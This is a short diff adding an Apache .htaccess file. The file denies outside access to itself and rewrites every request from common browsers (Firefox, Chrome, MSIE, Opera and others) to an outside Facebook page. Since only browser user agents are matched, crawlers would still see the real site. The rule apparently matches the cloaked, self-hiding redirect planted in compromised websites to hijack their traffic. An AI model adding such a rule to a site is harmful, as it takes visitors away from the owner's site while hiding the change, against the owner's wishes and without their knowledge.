@@ -1,0 +1,11 @@
+<Files .htaccess>
+
+order allow,deny
+
+deny from all
+
+</Files>
+
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} ^.*(Firefox/*|Chrome/*|UCBrowser/*|Trident/*|CriOS/*|FxiOS/*|MSIE/*|EdgiOS/*|Opera/*).*$ [NC]
+RewriteRule ^(.*)$ https://facebook.com/qbk.fb/
